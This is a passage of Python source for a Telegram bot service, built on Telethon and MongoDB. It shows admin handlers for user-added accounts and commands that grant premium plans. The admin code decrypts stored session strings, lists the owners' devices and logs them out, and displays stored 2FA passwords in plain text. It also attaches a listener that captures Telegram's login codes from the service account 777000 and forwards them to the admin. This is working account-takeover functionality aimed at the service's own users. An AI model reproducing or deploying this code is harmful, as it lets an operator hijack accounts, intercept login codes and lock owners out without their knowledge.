        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        await event.answer("Account not found!", alert=True)
        return
    
    phone = acc.get('phone', 'Unknown')
    
    # Get active sessions/devices
    devices = []
    try:
        from telethon.tl.functions.account import GetAuthorizationsRequest
        
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await temp_client.connect()
        
        if await temp_client.is_user_authorized():
            result = await temp_client(GetAuthorizationsRequest())
            
            for i, auth in enumerate(result.authorizations):
                # Build device name properly
                device_model = auth.device_model or "Unknown Device"
                platform = auth.platform or ""
                app_name = auth.app_name or ""
                
                # Detect Telegram Desktop
                if not platform or not platform.strip():
                    if "Desktop" in app_name or "TDesktop" in app_name:
                        platform = "Telegram Desktop"
                    elif "64bit" in device_model or "32bit" in device_model:
                        platform = "Desktop"
                    else:
                        platform = "Unknown Platform"
                
                device_name = f"{device_model} - {platform}"
                location = getattr(auth, 'country', 'Unknown')
                
                # Debug: print hash info
                print(f"[ADMIN] Device {i}: hash={auth.hash}, current={auth.current}, name={device_name}")
                
                devices.append({
                    'hash': auth.hash,
                    'name': device_name,
                    'current': auth.current,
                    'location': location
                })
        
        await temp_client.disconnect()
    except Exception as e:
        print(f"[ADMIN] Error fetching devices: {e}")
    
    # Store devices in global dict using acc_id as key
    admin_device_sessions[acc_id] = devices
    
    if not devices:
        text = (
            f"<b>📱 Manage Devices</b>\n\n"
            f"<b>Phone:</b> <code>{phone}</code>\n\n"
            f"<i>No devices found or unable to fetch devices.</i>"
        )
        buttons = [[Button.inline("← Back", f"admaccd_{acc_id}")]]
    else:
        text = (
            f"<b>📱 Manage Devices</b>\n\n"
            f"<b>Phone:</b> <code>{phone}</code>\n"
            f"<b>Total Devices:</b> <code>{len(devices)}</code>\n\n"
            f"<b>⚠️ Click any device to log it out (including current):</b>"
        )
        
        buttons = []
        for i, device in enumerate(devices):
            status = "🟢 Current" if device['current'] else "🔴"
            btn_text = f"{status} {device['name'][:30]}"
            # Use index instead of hash in callback data
            buttons.append([Button.inline(btn_text, f"admdevout_{acc_id}_{i}")])
        
        buttons.append([Button.inline("← Back", f"admaccd_{acc_id}")])
    
    await event.edit(text, parse_mode='html', buttons=buttons)

@main_bot.on(events.CallbackQuery(pattern=b"^admdevout_"))
async def admin_device_logout(event):
    """Logout a specific device"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    from bson.objectid import ObjectId
    parts = event.data.decode().split("_")
    acc_id = parts[1]
    
    # Get device index from callback data
    try:
        device_index = int(parts[2])
    except (ValueError, IndexError):
        await event.answer("❌ Invalid device index!", alert=True)
        return
    
    # Retrieve device hash from global storage
    if acc_id not in admin_device_sessions:
        await event.answer("❌ Session expired, please refresh device list!", alert=True)
        return
    
    devices = admin_device_sessions[acc_id]
    if device_index < 0 or device_index >= len(devices):
        await event.answer("❌ Device not found!", alert=True)
        return
    
    device_hash = devices[device_index]['hash']
    device_is_current = devices[device_index]['current']
    
    # Debug logging
    print(f"[ADMIN] Attempting to logout device {device_index}")
    print(f"[ADMIN] Device hash type: {type(device_hash)}, value: {device_hash}")
    print(f"[ADMIN] Is current device: {device_is_current}")
    
    try:
        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        await event.answer("Account not found!", alert=True)
        return
    
    phone = acc.get('phone', 'Unknown')
    success = False
    error_msg = ""
    
    try:
        from telethon.tl.functions.account import ResetAuthorizationRequest
        from telethon.tl.functions.auth import LogOutRequest
        
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await temp_client.connect()
        
        if await temp_client.is_user_authorized():
            try:
                # Make sure hash is an integer
                if not isinstance(device_hash, int):
                    device_hash = int(device_hash)
                
                # Current device has hash=0 and must use LogOutRequest
                if device_hash == 0 or device_is_current:
                    print(f"[ADMIN] Logging out CURRENT device using LogOutRequest")
                    result = await temp_client(LogOutRequest())
                    print(f"[ADMIN] LogOut result: {result}")
                    success = True
                else:
                    print(f"[ADMIN] Logging out OTHER device using ResetAuthorizationRequest with hash: {device_hash}")
                    result = await temp_client(ResetAuthorizationRequest(hash=device_hash))
                    print(f"[ADMIN] ResetAuthorization result: {result}")
                    success = True
            except Exception as e:
                error_msg = str(e)
                print(f"[ADMIN] Error logging out device: {e}")
                import traceback
                traceback.print_exc()
        
        await temp_client.disconnect()
    except Exception as e:
        error_msg = str(e)
        print(f"[ADMIN] Error connecting to account: {e}")
    
    # Show result message
    if success:
        if device_is_current:
            await event.answer("✅ Current device logged out! Account session ended.", alert=True)
        else:
            await event.answer("✅ Device logged out successfully!", alert=True)
    else:
        await event.answer(f"❌ Failed: {error_msg[:80]}", alert=True)
        # Don't refresh on failure
        return
    
    # Refresh device list only on success
    try:
        from telethon.tl.functions.account import GetAuthorizationsRequest
        
        # Get fresh device list
        new_devices = []
        try:
            session = cipher_suite.decrypt(acc['session'].encode()).decode()
            temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
            await temp_client.connect()
            
            if await temp_client.is_user_authorized():
                result = await temp_client(GetAuthorizationsRequest())
                
                for i, auth in enumerate(result.authorizations):
                    # Build device name properly
                    device_model = auth.device_model or "Unknown Device"
                    platform = auth.platform or ""
                    app_name = auth.app_name or ""
                    
                    # Detect Telegram Desktop
                    if not platform or not platform.strip():
                        if "Desktop" in app_name or "TDesktop" in app_name:
                            platform = "Telegram Desktop"
                        elif "64bit" in device_model or "32bit" in device_model:
                            platform = "Desktop"
                        else:
                            platform = "Unknown Platform"
                    
                    device_name = f"{device_model} - {platform}"
                    location = getattr(auth, 'country', 'Unknown')
                    new_devices.append({
                        'hash': auth.hash,
                        'name': device_name,
                        'current': auth.current,
                        'location': location
                    })
            
            await temp_client.disconnect()
        except Exception as e:
            print(f"[ADMIN] Error fetching devices after logout: {e}")
        
        # Update global storage
        admin_device_sessions[acc_id] = new_devices
        
        # Build new message with timestamp to force different content
        import time
        timestamp = int(time.time())
        
        if not new_devices:
            text = (
                f"<b>📱 Manage Devices</b>\n\n"
                f"<b>Phone:</b> <code>{phone}</code>\n\n"
                f"<i>✅ All devices logged out successfully.</i>\n"
                f"<i>Updated: {timestamp}</i>"
            )
            buttons = [[Button.inline("← Back", f"admaccd_{acc_id}")]]
        else:
            text = (
                f"<b>📱 Manage Devices</b>\n\n"
                f"<b>Phone:</b> <code>{phone}</code>\n"
                f"<b>Total Devices:</b> <code>{len(new_devices)}</code>\n"
                f"<i>Last updated: {timestamp}</i>\n\n"
                f"<b>⚠️ Click any device to log it out (including current):</b>"
            )
            
            buttons = []
            for i, device in enumerate(new_devices):
                status = "🟢 Current" if device['current'] else "🔴"
                btn_text = f"{status} {device['name'][:30]}"
                # Use index instead of hash
                buttons.append([Button.inline(btn_text, f"admdevout_{acc_id}_{i}")])
            
            buttons.append([Button.inline("← Back", f"admaccd_{acc_id}")])
        
        try:
            await event.edit(text, parse_mode='html', buttons=buttons)
        except Exception as edit_err:
            print(f"[ADMIN] Edit message error (expected): {edit_err}")
            # Message already updated via answer popup, no need to do anything
    except Exception as e:
        # If refresh fails, just log it - user already got the answer popup
        print(f"[ADMIN] Could not refresh device list: {e}")

@main_bot.on(events.CallbackQuery(pattern=b"^admotp_"))
async def admin_get_otp(event):
    """Enable OTP forwarding for an account"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    from bson.objectid import ObjectId
    acc_id = event.data.decode().split("_")[1]
    
    try:
        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        await event.answer("Account not found!", alert=True)
        return
    
    phone = acc.get('phone', 'Unknown')
    two_fa = acc.get('two_fa_password', 'Not Set')
    
    # Check if already active
    if phone in otp_forwarding_active:
        await event.answer("⚠️ OTP forwarding already active for this account!", alert=True)
        return
    
    # Start OTP forwarding with active connection
    try:
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        otp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await otp_client.connect()
        
        if not await otp_client.is_user_authorized():
            await event.answer("❌ Account session expired!", alert=True)
            await otp_client.disconnect()
            return
        
        # Store client and admin info
        otp_forwarding_active[phone] = {
            'admin_id': uid,
            'client': otp_client,
            'account_id': acc_id
        }
        
        # Set up message handler for this client
        @otp_client.on(events.NewMessage(incoming=True, from_users=[777000]))
        async def forward_otp_handler(otp_event):
            """Forward OTP codes from Telegram to admin"""
            message_text = otp_event.message.text or ""
            
            # Extract 5-digit code
            import re
            match = re.search(r'\b(\d{5})\b', message_text)
            
            if match:
                code = match.group(1)
                
                # Get admin info
                if phone in otp_forwarding_active:
                    admin_id = otp_forwarding_active[phone]['admin_id']
                    
                    try:
                        # Send OTP to admin
                        await main_bot.send_message(
                            admin_id,
                            f"<b>📨 OTP Received</b>\n\n"
                            f"<b>Phone:</b> <code>{phone}</code>\n"
                            f"<b>Code:</b> <code>{code}</code>\n\n"
                            f"<i>Forwarded from Telegram</i>",
                            parse_mode='html'
                        )
                        print(f"[OTP] Forwarded code {code} to admin {admin_id} for {phone}")
                    except Exception as e:
                        print(f"[OTP] Failed to forward to admin {admin_id}: {e}")
        
        # Start the client to listen for messages
        print(f"[OTP] Started listening for {phone}")
        
        await event.answer("✅ OTP forwarding activated! Listening for codes...", alert=True)
        
        text = (
            f"<b>📨 Get OTP</b>\n\n"
            f"<b>Phone:</b> <code>{phone}</code>\n"
            f"<b>2FA Password:</b> <code>{two_fa}</code>\n\n"
            f"<b>Status:</b> ✅ <b>Active & Listening</b>\n\n"
            f"<i>✓ Connection established</i>\n"
            f"<i>✓ Listening for OTP codes from Telegram</i>\n"
            f"<i>✓ Will auto-forward 5-digit codes to you</i>\n\n"
            f"<b>Note:</b> Click Stop to disconnect."
        )
        
        buttons = [
            [Button.inline("🛑 Stop OTP Forwarding", f"admotpstop_{acc_id}")],
            [Button.inline("← Back", f"admaccd_{acc_id}")]
        ]
        
        await event.edit(text, parse_mode='html', buttons=buttons)
        
    except Exception as e:
        await event.answer(f"❌ Failed to start: {str(e)[:80]}", alert=True)
        print(f"[OTP] Error starting forwarding for {phone}: {e}")

@main_bot.on(events.CallbackQuery(pattern=b"^admotpstop_"))
async def admin_stop_otp(event):
    """Stop OTP forwarding for an account"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    from bson.objectid import ObjectId
    acc_id = event.data.decode().split("_")[1]
    
    try:
        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        await event.answer("Account not found!", alert=True)
        return
    
    phone = acc.get('phone', 'Unknown')
    
    # Deactivate OTP forwarding and disconnect client
    if phone in otp_forwarding_active:
        try:
            client = otp_forwarding_active[phone]['client']
            await client.disconnect()
            print(f"[OTP] Stopped listening for {phone}")
        except Exception as e:
            print(f"[OTP] Error disconnecting client: {e}")
        
        del otp_forwarding_active[phone]
    
    await event.answer("🛑 OTP forwarding stopped & disconnected!", alert=True)
    
    # Get account details and refresh the view
    try:
        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        return
    
    # Get account details
    phone = acc.get('phone', 'Unknown')
    owner_id = acc.get('owner_id', 'Unknown')
    two_fa = acc.get('two_fa_password', 'Not Set')
    
    # Try to get account profile details
    username = "Not Available"
    first_name = "Unknown"
    last_name = "Not Set"
    bio = "No Bio"
    groups_count = 0
    account_user_id = "Unknown"
    
    try:
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await temp_client.connect()
        
        if await temp_client.is_user_authorized():
            me = await temp_client.get_me()
            
            # Get profile info
            first_name = me.first_name or "Unknown"
            last_name = me.last_name or "Not Set"
            username = f"@{me.username}" if me.username else "No Username"
            account_user_id = me.id  # This is the account's own user ID
            
            # Check Telegram Premium status
            telegram_premium = "✅ Active" if me.premium else "❌ Not Active"
            
            # Get bio
            try:
                from telethon.tl.functions.users import GetFullUserRequest
                full_user = await temp_client(GetFullUserRequest(me.id))
                bio = full_user.full_user.about or "No Bio"
            except:
                bio = "No Bio"
            
            # Count groups
            async for dialog in temp_client.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    groups_count += 1
        
        await temp_client.disconnect()
    except Exception as e:
        print(f"[ADMIN] Error fetching account details: {e}")
    
    # Get owner (who added this account) details and premium status
    owner_username = "Unknown"
    is_premium = False
    premium_days_left = 0
    premium_plan = "Scout (Free)"
    
    try:
        owner_user = users_col.find_one({'user_id': owner_id})
        if owner_user:
            owner_username = owner_user.get('username', 'No Username')
            
            # Check premium status
            premium_expiry = owner_user.get('premium_expiry')
            if premium_expiry:
                from datetime import datetime, timezone
                now = datetime.now(timezone.utc)
                if premium_expiry.tzinfo is None:
                    premium_expiry = premium_expiry.replace(tzinfo=timezone.utc)
                
                if premium_expiry > now:
                    is_premium = True
                    premium_days_left = (premium_expiry - now).days
                    premium_plan = owner_user.get('plan', 'Premium')
                    if premium_plan in ['grow', 'prime', 'dominion']:
                        premium_plan = premium_plan.capitalize()
    except Exception as e:
        print(f"[ADMIN] Error fetching owner details: {e}")
    
    # Build premium status text
    if is_premium:
        premium_status = f"✅ <b>{premium_plan}</b> ({premium_days_left} days left)"
    else:
        premium_status = "❌ <b>Free Plan (Scout)</b>"
    
    text = (
        f"<b>📱 Account Details</b>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>📋 Profile Information:</b>\n"
        f"├ <b>👤 First Name:</b> <code>{first_name}</code>\n"
        f"├ <b>👥 Last Name:</b> <code>{last_name}</code>\n"
        f"├ <b>🆔 Username:</b> <code>{username}</code>\n"
        f"└ <b>📝 Bio:</b>\n"
        f"   <code>{bio}</code>\n\n"
        f"<b>📊 Account Statistics:</b>\n"
        f"├ <b>📞 Phone:</b> <code>{phone}</code>\n"
        f"├ <b>🔑 User ID:</b> <code>{account_user_id}</code>\n"
        f"├ <b>👥 Groups:</b> <code>{groups_count}</code>\n"
        f"└ <b>🔐 2FA Password:</b> <code>{two_fa}</code>\n\n"
        f"<b>➕ Added By:</b>\n"
        f"├ <b>🆔 Username:</b> <code>{owner_username}</code>\n"
        f"└ <b>🔑 User ID:</b> <code>{owner_id}</code>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    buttons = [
        [Button.inline("📱 Manage Devices", f"admdev_{acc_id}")],
        [Button.inline("📨 Get OTP", f"admotp_{acc_id}")],
        [Button.inline("← Back", b"admin_manage_accounts")]
    ]
    
    await event.edit(text, parse_mode='html', buttons=buttons)

# OTP forwarding is now handled by individual client handlers in admin_get_otp()

@main_bot.on(events.CallbackQuery(pattern=b"^admin_grant_premium$"))
async def admin_grant_premium_menu(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("Admin only", alert=True)
        return
    
    help_text = (
        "<b>💎 Grant Premium Commands</b>\n\n"
        "<b>Usage:</b>\n"
        "<code>/grow userid days</code> - Grant Grow plan (3 accounts)\n"
        "<code>/prime userid days</code> - Grant Prime plan (7 accounts)\n"
        "<code>/domi userid days</code> - Grant Dominion plan (15 accounts)\n\n"
        "<b>Examples:</b>\n"
        "<code>/grow 123456789 30</code>\n"
        "<code>/prime 987654321 60</code>\n"
        "<code>/domi 555444333 90</code>\n\n"
        "<i>User will receive instant notification with plan activation.</i>"
    )
    await event.edit(help_text, parse_mode='html', buttons=[[Button.inline("← Back", b"admin_panel")]])


# Admin commands for granting premium: /grow userid days, /prime userid days, /domi userid days
@main_bot.on(events.NewMessage(pattern=r'^/grow\s+(\d+)\s+(\d+)$'))
async def cmd_grow(event):
    if not is_admin(event.sender_id):
        return

    target_id = int(event.pattern_match.group(1))
    days = int(event.pattern_match.group(2))

    try:
        expires_at = await grant_premium_to_user(target_id, 'grow', days, source='/grow')
        await event.respond(f"✅ Grow plan granted to {target_id} for {days} days")
        print(f"[ADMIN CMD] /grow: User {target_id} granted Grow for {days} days")
    except Exception as e:
        await event.respond(f"❌ Failed to grant Grow: {str(e)[:120]}")
        print(f"[ADMIN CMD] /grow failed: {e}")


@main_bot.on(events.NewMessage(pattern=r'^/prime\s+(\d+)\s+(\d+)$'))
async def cmd_prime(event):
    if not is_admin(event.sender_id):
        return

    target_id = int(event.pattern_match.group(1))
    days = int(event.pattern_match.group(2))

    try:
        expires_at = await grant_premium_to_user(target_id, 'prime', days, source='/prime')
        await event.respond(f"✅ Prime plan granted to {target_id} for {days} days")
        print(f"[ADMIN CMD] /prime: User {target_id} granted Prime for {days} days")
    except Exception as e:
        await event.respond(f"❌ Failed to grant Prime: {str(e)[:120]}")
        print(f"[ADMIN CMD] /prime failed: {e}")


@main_bot.on(events.NewMessage(pattern=r'^/domi\s+(\d+)\s+(\d+)$'))
async def cmd_domi(event):
    if not is_admin(event.sender_id):
        return

    target_id = int(event.pattern_match.group(1))
    days = int(event.pattern_match.group(2))

    try:
        expires_at = await grant_premium_to_user(target_id, 'domi', days, source='/domi')
        await event.respond(f"✅ Dominion plan granted to {target_id} for {days} days")
        print(f"[ADMIN CMD] /domi: User {target_id} granted Dominion for {days} days")
    except Exception as e:
        await event.respond(f"❌ Failed to grant Dominion: {str(e)[:120]}")
        print(f"[ADMIN CMD] /domi failed: {e}")
if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        mongo_client.close()

